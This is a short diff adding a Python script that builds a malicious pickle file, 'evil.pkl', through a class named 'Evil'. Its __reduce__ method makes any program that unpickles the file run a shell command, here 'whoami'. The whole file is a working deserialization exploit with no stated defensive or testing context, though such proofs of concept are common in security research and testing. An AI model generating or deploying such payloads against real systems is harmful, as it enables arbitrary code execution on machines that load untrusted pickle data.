@@ -1,0 +1,8 @@
+import pickle
+import os
+
+class Evil:
+    def __reduce__(self):
+        return (os.system, ("whoami",))
+
+pickle.dump(Evil(), open("evil.pkl","wb"))
